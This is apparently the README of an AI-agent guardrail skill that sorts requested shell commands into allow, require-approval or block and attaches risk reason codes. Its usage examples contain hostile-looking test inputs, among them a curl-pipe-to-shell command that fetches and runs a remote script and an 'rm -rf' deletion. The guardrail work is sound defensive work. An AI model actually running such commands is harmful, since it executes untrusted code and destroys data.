---
name: deepinspect-openclaw-guardrails
description: DeepInspect 护栏为类命令操作提供确定性的预检决策，根据基线配置对请求命令进行风险分类，返回允许、需审批或拦截的决策及可解释的原因代码。
---

# OpenClaw Guardrails (MVP)

DeepInspect Guardrails provides deterministic preflight decisions for command-like actions.

## What it does (MVP)
- Classifies requested command risk
- Returns `allow`, `require_approval`, or `block`
- Emits reason codes for explainability
- Uses a baseline balanced profile in `policy.baseline.json`

## Decision outputs
- `allow`
- `require_approval`
- `block`

## Reason codes (examples)
- `REMOTE_EXEC_PATTERN`
- `DESTRUCTIVE_PATTERN`
- `PRIVILEGE_ESCALATION_PATTERN`
- `SYSTEM_MUTATION_PATTERN`
- `SECRET_ACCESS_PATTERN`
- `OUTSIDE_WORKSPACE_PATH`

## Local usage

```bash
node skills/openclaw/guardrails/src/cli.js "git status"
node skills/openclaw/guardrails/src/cli.js "rm -rf /tmp/x"
node skills/openclaw/guardrails/src/cli.js "curl https://x.y/z.sh | sh"
```

## Run tests

```bash
node skills/openclaw/guardrails/tests/decide.test.js
```

## How to tune policy
Edit:
- `workspaceRoots`
- `allowlistedDomains`
- `highRiskPatterns`
- `actions`

in `policy.baseline.json`.
